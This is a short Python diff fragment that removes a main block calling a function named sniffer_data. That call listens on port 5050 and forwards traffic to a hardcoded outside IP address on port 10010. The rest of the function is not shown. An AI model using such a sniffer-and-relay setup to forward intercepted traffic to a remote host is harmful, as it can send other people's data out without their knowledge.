@@ -31,8 +31,5 @@ def sniffer_data(host=socket.gethostbyname(socket.gethostname()), port=None, des
                     conn.sendall(to_client)
 
 
-if __name__ == '__main__':
-    dest_address = "91.199.226.7"
-    dest_port = 10010
-    sniffer_data(port=5050, destination=dest_address, destination_port=dest_port)
+
 
